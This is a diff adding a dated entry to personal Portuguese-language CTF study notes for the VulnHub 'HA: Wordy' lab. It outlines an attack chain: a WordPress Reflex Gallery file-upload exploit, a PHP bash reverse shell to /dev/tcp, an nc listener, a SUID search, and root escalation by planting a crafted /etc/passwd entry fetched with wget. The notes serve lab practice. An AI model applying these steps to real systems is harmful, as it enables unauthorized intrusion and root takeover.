@@ -5,6 +5,7 @@ desafio 3 - https://www.vulnhub.com/entry/droopy-v02,143/
 desafio 4 - https://www.vulnhub.com/entry/digitalworldlocal-joy,298/
 desafio 5 - https://www.vulnhub.com/entry/violator-1,153/
 desafio 6 - https://www.vulnhub.com/entry/w1r3s-101,220/
+Desafio 7 - https://www.vulnhub.com/entry/ha-wordy,363/
 
 --VM--
   
@@ -154,3 +155,37 @@ Dia 6 			12/9/2020
 
 		
 	*ssh
+
+Dia 7 			13/9/2020
+
+	*scan alvo
+	
+	*enumerar plugins wp
+		WordPress Plugin Reflex Gallery 3.1.3 - Arbitrary File Upload
+			criar um html
+	*criar um shell reverse
+		<?php
+			exec("/bin/bash -c 'bash -i >& /dev/tcp/my_ip/porta 0 >&1' ");		
+		?>
+
+	*nc -lnvp 
+	*abrir o arquivo(*criar um html*) no server
+	
+	*encontrando arqivos suid
+		find / -perm -u=s -type f 2>/dev/null
+	
+	*passwd
+		criar um com base do alvo, adicionar user
+			pcpc:hash_opensll:0:0:root:/root:/bin/bash   -> igual do root, porém user diferente e com hash senha no lugar do x
+				senha default linux -> openssl passwd -1 -salt pcpc batata
+				
+	*simple server com python
+		python -m SimpleHHTPServer 8081
+		
+	*baixar o novo arquivo passwd do kali
+		wget http://ip_kali:8081/passwd
+		erro no nome arquivo -> saida de passwd vai para passwd -> wget  -O passwd http://ip_kali:8081/passwd
+		
+		su pcpc 
+			pass -> batata
+			root pois está no mesmo grupo
